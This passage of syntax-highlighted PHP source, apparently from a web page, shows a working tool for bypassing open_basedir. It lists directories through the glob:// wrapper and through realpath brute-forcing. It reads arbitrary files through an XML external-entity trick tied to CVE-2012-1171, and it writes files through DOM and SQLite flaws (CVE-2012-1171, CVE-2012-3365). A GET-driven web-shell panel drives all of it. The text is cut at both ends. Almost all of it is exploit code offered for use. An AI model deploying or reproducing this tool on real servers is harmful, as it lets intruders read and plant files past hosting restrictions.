<span class="string">'/'</span>, $to);</span><br><span class="line"> </span><br><span class="line">$from = explode(<span class="string">'/'</span>, $from);</span><br><span class="line">$to = explode(<span class="string">'/'</span>, $to);</span><br><span class="line">$relPath = $to;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">foreach</span> ($from <span class="keyword">as</span> $depth =&gt; $dir) &#123;</span><br><span class="line"><span class="comment">// find first non-matching dir</span></span><br><span class="line"><span class="keyword">if</span> ($dir === $to[$depth]) &#123;</span><br><span class="line"><span class="comment">// ignore this directory</span></span><br><span class="line">array_shift($relPath);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// get number of remaining dirs to $from</span></span><br><span class="line">$remaining = count($from) - $depth;</span><br><span class="line"><span class="keyword">if</span> ($remaining &gt; <span class="number">1</span>) &#123;</span><br><span class="line"><span class="comment">// add traversals up to first matching dir</span></span><br><span class="line">$padLength = (count($relPath) + $remaining - <span class="number">1</span>) * <span class="number">-1</span>;</span><br><span class="line">$relPath = array_pad($relPath, $padLength, <span class="string">'..'</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$relPath[<span class="number">0</span>] = <span class="string">'./'</span> . $relPath[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> implode(<span class="string">'/'</span>, $relPath);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fallback</span><span class="params">($classes)</span> </span>&#123;</span><br><span class="line"><span class="keyword">foreach</span> ($classes <span class="keyword">as</span> $class) &#123;</span><br><span class="line">$object = <span class="keyword">new</span> $class;</span><br><span class="line"><span class="keyword">if</span> ($object-&gt;isAvailable()) &#123;</span><br><span class="line"><span class="keyword">return</span> $object;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> NoExploit;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// Core classes</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Exploitable</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isAvailable</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getDescription</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NoExploit</span> <span class="keyword">implements</span> <span class="title">Exploitable</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isAvailable</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getDescription</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">'No exploit is available.'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">DirectoryLister</span> <span class="keyword">implements</span> <span class="title">Exploitable</span> </span>&#123;</span><br><span class="line"><span class="keyword">var</span> $currentPath;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isAvailable</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getDescription</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFileList</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setCurrentPath</span><span class="params">($currentPath)</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;currentPath = $currentPath;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getCurrentPath</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;currentPath;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GlobWrapperDirectoryLister</span> <span class="keyword">extends</span> <span class="title">DirectoryLister</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isAvailable</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> stripos(PHP_OS, <span class="string">'win'</span>) === <span class="keyword">FALSE</span> &amp;&amp; in_array(<span class="string">'glob'</span>, stream_get_wrappers());</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getDescription</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">'Directory listing via glob pattern'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFileList</span><span class="params">()</span> </span>&#123;</span><br><span class="line">$file_list = <span class="keyword">array</span>();</span><br><span class="line"><span class="comment">// normal files</span></span><br><span class="line">$it = <span class="keyword">new</span> DirectoryIterator(<span class="string">"glob://&#123;$this-&gt;getCurrentPath()&#125;*"</span>);</span><br><span class="line"><span class="keyword">foreach</span> ($it <span class="keyword">as</span> $f) &#123;</span><br><span class="line">$file_list[] = $f-&gt;__toString();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// special files (starting with a dot(.))</span></span><br><span class="line">$it = <span class="keyword">new</span> DirectoryIterator(<span class="string">"glob://&#123;$this-&gt;getCurrentPath()&#125;.*"</span>);</span><br><span class="line"><span class="keyword">foreach</span> ($it <span class="keyword">as</span> $f) &#123;</span><br><span class="line">$file_list[] = $f-&gt;__toString();</span><br><span class="line">&#125;</span><br><span class="line">sort($file_list);</span><br><span class="line"><span class="keyword">return</span> $file_list;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RealpathBruteForceDirectoryLister</span> <span class="keyword">extends</span> <span class="title">DirectoryLister</span> </span>&#123;</span><br><span class="line"><span class="keyword">var</span> $characters = <span class="string">'abcdefghijklmnopqrstuvwxyz0123456789-_'</span></span><br><span class="line">, $extension = <span class="keyword">array</span>()</span><br><span class="line">, $charactersLength = <span class="number">38</span></span><br><span class="line">, $maxlength = <span class="number">3</span></span><br><span class="line">, $fileList = <span class="keyword">array</span>();</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isAvailable</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> ini_get(<span class="string">'open_basedir'</span>) &amp;&amp; function_exists(<span class="string">'realpath'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getDescription</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">'Directory listing via brute force searching with realpath function.'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setCharacters</span><span class="params">($characters)</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;characters = $characters;</span><br><span class="line"><span class="keyword">$this</span>-&gt;charactersLength = count($characters);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setExtension</span><span class="params">($extension)</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;extension = $extension;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setMaxlength</span><span class="params">($maxlength)</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;maxlength = $maxlength;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFileList</span><span class="params">()</span> </span>&#123;</span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line">set_error_handler(<span class="keyword">array</span>(<span class="keyword">__CLASS__</span>, <span class="string">'handler'</span>));</span><br><span class="line">$number_set = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">while</span> (count($number_set = <span class="keyword">$this</span>-&gt;nextCombination($number_set, <span class="number">0</span>)) &lt;= <span class="keyword">$this</span>-&gt;maxlength) &#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;searchFile($number_set);</span><br><span class="line">&#125;</span><br><span class="line">sort(<span class="keyword">$this</span>-&gt;fileList);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;fileList;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">nextCombination</span><span class="params">($number_set, $length)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($number_set[$length])) &#123;</span><br><span class="line">$number_set[$length] = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> $number_set;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($number_set[$length] + <span class="number">1</span> === <span class="keyword">$this</span>-&gt;charactersLength) &#123;</span><br><span class="line">$number_set[$length] = <span class="number">0</span>;</span><br><span class="line">$number_set = <span class="keyword">$this</span>-&gt;nextCombination($number_set, $length + <span class="number">1</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$number_set[$length]++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $number_set;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">searchFile</span><span class="params">($number_set)</span> </span>&#123;</span><br><span class="line">$file_name = <span class="string">'a'</span>;</span><br><span class="line"><span class="keyword">foreach</span> ($number_set <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">$file_name[$key] = <span class="keyword">$this</span>-&gt;characters[$value];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// normal files</span></span><br><span class="line">realpath(<span class="keyword">$this</span>-&gt;getCurrentPath() . $file_name);</span><br><span class="line"><span class="comment">// files with preceeding dot</span></span><br><span class="line">realpath(<span class="keyword">$this</span>-&gt;getCurrentPath() . <span class="string">'.'</span> . $file_name);</span><br><span class="line"><span class="comment">// files with extension</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;extension <span class="keyword">as</span> $extension) &#123;</span><br><span class="line">realpath(<span class="keyword">$this</span>-&gt;getCurrentPath() . $file_name . $extension);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handler</span><span class="params">($errno, $errstr, $errfile, $errline)</span> </span>&#123;</span><br><span class="line">$regexp = <span class="string">'/File\((.*)\) is not within/'</span>;</span><br><span class="line">preg_match($regexp, $errstr, $matches);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($matches[<span class="number">1</span>])) &#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;fileList[] = $matches[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">FileWriter</span> <span class="keyword">implements</span> <span class="title">Exploitable</span> </span>&#123;</span><br><span class="line"><span class="keyword">var</span> $filePath;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isAvailable</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getDescription</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">($content)</span> </span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setFilePath</span><span class="params">($filePath)</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;filePath = $filePath;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFilePath</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;filePath;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">FileReader</span> <span class="keyword">implements</span> <span class="title">Exploitable</span> </span>&#123;</span><br><span class="line"><span class="keyword">var</span> $filePath;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isAvailable</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getDescription</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setFilePath</span><span class="params">($filePath)</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;filePath = $filePath;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFilePath</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;filePath;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// Assistant class for DOMFileWriter &amp; DOMFileReader</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StreamExploiter</span> </span>&#123;</span><br><span class="line"><span class="keyword">var</span> $mode, $filePath, $fileContent;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">stream_close</span><span class="params">()</span> </span>&#123;</span><br><span class="line">$doc = <span class="keyword">new</span> DOMDocument;</span><br><span class="line">$doc-&gt;strictErrorChecking = <span class="keyword">false</span>;</span><br><span class="line"><span class="keyword">switch</span> (<span class="keyword">$this</span>-&gt;mode) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'w'</span>:</span><br><span class="line">$doc-&gt;loadHTML(<span class="keyword">$this</span>-&gt;fileContent);</span><br><span class="line">$doc-&gt;removeChild($doc-&gt;firstChild);</span><br><span class="line">$doc-&gt;saveHTMLFile(<span class="keyword">$this</span>-&gt;filePath);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="string">'r'</span>:</span><br><span class="line">$doc-&gt;resolveExternals = <span class="keyword">true</span>;</span><br><span class="line">$doc-&gt;substituteEntities = <span class="keyword">true</span>;</span><br><span class="line">$doc-&gt;loadXML(<span class="string">"&lt;!DOCTYPE doc [&lt;!ENTITY file SYSTEM \"file://&#123;$this-&gt;filePath&#125;\"&gt;]&gt;&lt;doc&gt;&amp;file;&lt;/doc&gt;"</span>, LIBXML_PARSEHUGE);</span><br><span class="line"><span class="keyword">echo</span> $doc-&gt;documentElement-&gt;firstChild-&gt;nodeValue;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">stream_open</span><span class="params">($path, $mode, $options, &amp;$opened_path)</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;filePath = substr($path, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">$this</span>-&gt;mode = $mode;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">stream_write</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;fileContent = $data;</span><br><span class="line"><span class="keyword">return</span> strlen($data);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DOMFileWriter</span> <span class="keyword">extends</span> <span class="title">FileWriter</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isAvailable</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> extension_loaded(<span class="string">'dom'</span>) &amp;&amp; (version_compare(phpversion(), <span class="string">'5.3.10'</span>, <span class="string">'&lt;='</span>) || version_compare(phpversion(), <span class="string">'5.4.0'</span>, <span class="string">'='</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getDescription</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">'Write to and create a file exploiting CVE-2012-1171 (allow overriding). Notice the content should be in well-formed XML format.'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">($content)</span> </span>&#123;</span><br><span class="line"><span class="comment">// set it to global resource in order to trigger RSHUTDOWN</span></span><br><span class="line"><span class="keyword">global</span> $_DOM_exploit_resource;</span><br><span class="line">stream_wrapper_register(<span class="string">'exploit'</span>, <span class="string">'StreamExploiter'</span>);</span><br><span class="line">$_DOM_exploit_resource = fopen(<span class="string">"exploit://&#123;$this-&gt;getFilePath()&#125;"</span>, <span class="string">'w'</span>);</span><br><span class="line">fwrite($_DOM_exploit_resource, $content);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DOMFileReader</span> <span class="keyword">extends</span> <span class="title">FileReader</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isAvailable</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> extension_loaded(<span class="string">'dom'</span>) &amp;&amp; (version_compare(phpversion(), <span class="string">'5.3.10'</span>, <span class="string">'&lt;='</span>) || version_compare(phpversion(), <span class="string">'5.4.0'</span>, <span class="string">'='</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getDescription</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">'Read a file exploiting CVE-2012-1171. Notice the content should be in well-formed XML format.'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">// set it to global resource in order to trigger RSHUTDOWN</span></span><br><span class="line"><span class="keyword">global</span> $_DOM_exploit_resource;</span><br><span class="line">stream_wrapper_register(<span class="string">'exploit'</span>, <span class="string">'StreamExploiter'</span>);</span><br><span class="line">$_DOM_exploit_resource = fopen(<span class="string">"exploit://&#123;$this-&gt;getFilePath()&#125;"</span>, <span class="string">'r'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SqliteFileWriter</span> <span class="keyword">extends</span> <span class="title">FileWriter</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isAvailable</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> is_writable(getcwd())</span><br><span class="line">&amp;&amp; (extension_loaded(<span class="string">'sqlite3'</span>) || extension_loaded(<span class="string">'sqlite'</span>))</span><br><span class="line">&amp;&amp; (version_compare(phpversion(), <span class="string">'5.3.15'</span>, <span class="string">'&lt;='</span>) || (version_compare(phpversion(), <span class="string">'5.4.5'</span>, <span class="string">'&lt;='</span>) &amp;&amp; PHP_MINOR_VERSION == <span class="number">4</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getDescription</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">'Create a file with custom content exploiting CVE-2012-3365 (disallow overriding). Junk contents may be inserted'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">($content)</span> </span>&#123;</span><br><span class="line">$sqlite_class = extension_loaded(<span class="string">'sqlite3'</span>) ? <span class="string">'sqlite3'</span> : <span class="string">'SQLiteDatabase'</span>;</span><br><span class="line">mkdir(<span class="string">':memory:'</span>);</span><br><span class="line">$payload_path = getRelativePath(getcwd() . <span class="string">'/:memory:'</span>, <span class="keyword">$this</span>-&gt;getFilePath());</span><br><span class="line">$payload = str_replace(<span class="string">'\''</span>, <span class="string">'\'\''</span>, $content);</span><br><span class="line">$database = <span class="keyword">new</span> $sqlite_class(<span class="string">":memory:/&#123;$payload_path&#125;"</span>);</span><br><span class="line">$database-&gt;exec(<span class="string">"CREATE TABLE foo (bar STRING)"</span>);</span><br><span class="line">$database-&gt;exec(<span class="string">"INSERT INTO foo (bar) VALUES ('&#123;$payload&#125;')"</span>);</span><br><span class="line">$database-&gt;close();</span><br><span class="line">rmdir(<span class="string">':memory:'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// End of Core</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$action = <span class="keyword">isset</span>($_GET[<span class="string">'action'</span>]) ? $_GET[<span class="string">'action'</span>] : <span class="string">''</span>;</span><br><span class="line">$cwd = <span class="keyword">isset</span>($_GET[<span class="string">'cwd'</span>]) ? $_GET[<span class="string">'cwd'</span>] : getcwd();</span><br><span class="line">$cwd = rtrim($cwd, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR;</span><br><span class="line">$directorLister = fallback(<span class="keyword">array</span>(<span class="string">'GlobWrapperDirectoryLister'</span>, <span class="string">'RealpathBruteForceDirectoryLister'</span>));</span><br><span class="line">$fileWriter = fallback(<span class="keyword">array</span>(<span class="string">'DOMFileWriter'</span>, <span class="string">'SqliteFileWriter'</span>));</span><br><span class="line">$fileReader = fallback(<span class="keyword">array</span>(<span class="string">'DOMFileReader'</span>));</span><br><span class="line">$append = <span class="string">''</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;style&gt;</span><br><span class="line"><span class="comment">#panel &#123;</span></span><br><span class="line">  height: <span class="number">200</span>px;</span><br><span class="line">  overflow: hidden;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#panel &gt; pre &#123;</span></span><br><span class="line">  margin: <span class="number">0</span>;</span><br><span class="line">  height: <span class="number">200</span>px;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;div id=<span class="string">"panel"</span>&gt;</span><br><span class="line">&lt;pre id=<span class="string">"dl"</span>&gt;</span><br><span class="line">open_basedir: &lt;span style=<span class="string">"color: red"</span>&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> ini_get(<span class="string">'open_basedir'</span>) ? ini_get(<span class="string">'open_basedir'</span>) : <span class="string">'Off'</span>; <span class="meta">?&gt;</span>&lt;/span&gt;</span><br><span class="line">&lt;form style=<span class="string">"display:inline-block"</span> action=<span class="string">""</span>&gt;</span><br><span class="line">&lt;fieldset&gt;&lt;legend&gt;Directory Listing:&lt;/legend&gt;Current Directory: &lt;input name=<span class="string">"cwd"</span> size=<span class="string">"100"</span> value=<span class="string">"&lt;?php echo $cwd; ?&gt;"</span>&gt;&lt;input type=<span class="string">"submit"</span> value=<span class="string">"Go"</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span> (get_class($directorLister) === <span class="string">'RealpathBruteForceDirectoryLister'</span>): <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$characters = <span class="keyword">isset</span>($_GET[<span class="string">'characters'</span>]) ? $_GET[<span class="string">'characters'</span>] : $directorLister-&gt;characters;</span><br><span class="line">$maxlength = <span class="keyword">isset</span>($_GET[<span class="string">'maxlength'</span>]) ? $_GET[<span class="string">'maxlength'</span>] : $directorLister-&gt;maxlength;</span><br><span class="line">$append = <span class="string">"&amp;characters=&#123;$characters&#125;&amp;maxlength=&#123;$maxlength&#125;"</span>;</span><br><span class="line"> </span><br><span class="line">$directorLister-&gt;setMaxlength($maxlength);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">Search Characters: &lt;input name=<span class="string">"characters"</span> size=<span class="string">"100"</span> value=<span class="string">"&lt;?php echo $characters; ?&gt;"</span>&gt;</span><br><span class="line">Maxlength of File: &lt;input name=<span class="string">"maxlength"</span> size=<span class="string">"1"</span> value=<span class="string">"&lt;?php echo $maxlength; ?&gt;"</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">endif</span>;<span class="meta">?&gt;</span></span><br><span class="line">Description      : &lt;strong&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $directorLister-&gt;getDescription(); <span class="meta">?&gt;</span>&lt;/strong&gt;</span><br><span class="line">&lt;/fieldset&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/pre&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file_path = <span class="keyword">isset</span>($_GET[<span class="string">'file_path'</span>]) ? $_GET[<span class="string">'file_path'</span>] : <span class="string">''</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;pre id=<span class="string">"rf"</span>&gt;</span><br><span class="line">open_basedir: &lt;span style=<span class="string">"color: red"</span>&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> ini_get(<span class="string">'open_basedir'</span>) ? ini_get(<span class="string">'open_basedir'</span>) : <span class="string">'Off'</span>; <span class="meta">?&gt;</span>&lt;/span&gt;</span><br><span class="line">&lt;form style=<span class="string">"display:inline-block"</span> action=<span class="string">""</span>&gt;</span><br><span class="line">&lt;fieldset&gt;&lt;legend&gt;Read File :&lt;/legend&gt;File Path: &lt;input name=<span class="string">"file_path"</span> size=<span class="string">"100"</span> value=<span class="string">"&lt;?php echo $file_path; ?&gt;"</span>&gt;&lt;input type=<span class="string">"submit"</span> value=<span class="string">"Read"</span>&gt;</span><br><span class="line">Description: &lt;strong&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $fileReader-&gt;getDescription(); <span class="meta">?&gt;</span>&lt;/strong&gt;&lt;input type=<span class="string">"hidden"</span> name=<span class="string">"action"</span> value=<span class="string">"rf"</span>&gt;</span><br><span class="line">&lt;/fieldset&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/pre&gt;</span><br><span class="line">&lt;pre id=<span class="string">"wf"</span>&gt;</span><br><span class="line">open_basedir: &lt;span style=<span class="string">"color: red"</span>&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> ini_get(<span class="string">'open_basedir'</span>) ? ini_get(<span class="string">'open_basedir'</span>) : <span class="string">'Off'</span>; <span class="meta">?&gt;</span>&lt;/span&gt;</span><br><span class="line">&lt;form style=<span class="string">"display:inline-block"</span> action=<span class="string">""</span>&gt;</span><br><span class="line">&lt;fieldset&gt;&lt;legend&gt;Write File :&lt;/legend&gt;File Path   : &lt;input name=<span class="string">"file_path"</span> size=<span class="string">"100"</span> value=<span class="string">"&lt;?php echo $file_path; ?&gt;"</span>&gt;&lt;input type=<span class="string">"submit"</span> value=<span class="string">"Write"</span>&gt;</span><br><span class="line">File Content: &lt;textarea cols=<span class="string">"70"</span> name=<span class="string">"content"</span>&gt;&lt;/textarea&gt;</span><br><span class="line">Description : &lt;strong&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $fileWriter-&gt;getDescription(); <span class="meta">?&gt;</span>&lt;/strong&gt;&lt;input type=<span class="string">"hidden"</span> name=<span class="string">"action"</span> value=<span class="string">"wf"</span>&gt;</span><br><span class="line">&lt;/fieldset&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/pre&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;a href=<span class="string">"#dl"</span>&gt;Directory Listing&lt;/a&gt; | &lt;a href=<span class="string">"#rf"</span>&gt;Read File&lt;/a&gt; | &lt;a href=<span class="string">"#wf"</span>&gt;Write File&lt;/a&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">&lt;pre&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span> ($action === <span class="string">'rf'</span>): <span class="meta">?&gt;</span></span><br><span class="line">&lt;plaintext&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$fileReader-&gt;setFilePath($file_path);</span><br><span class="line"><span class="keyword">echo</span> $fileReader-&gt;read();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">elseif</span> ($action === <span class="string">'wf'</span>): <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'content'</span>])) &#123;</span><br><span class="line">$fileWriter-&gt;setFilePath($file_path);</span><br><span class="line">$fileWriter-&gt;write($_GET[<span class="string">'content'</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'The file should be written.'</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Something goes wrong.'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">else</span>: <span class="meta">?&gt;</span></span><br><span class="line">&lt;ol&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span 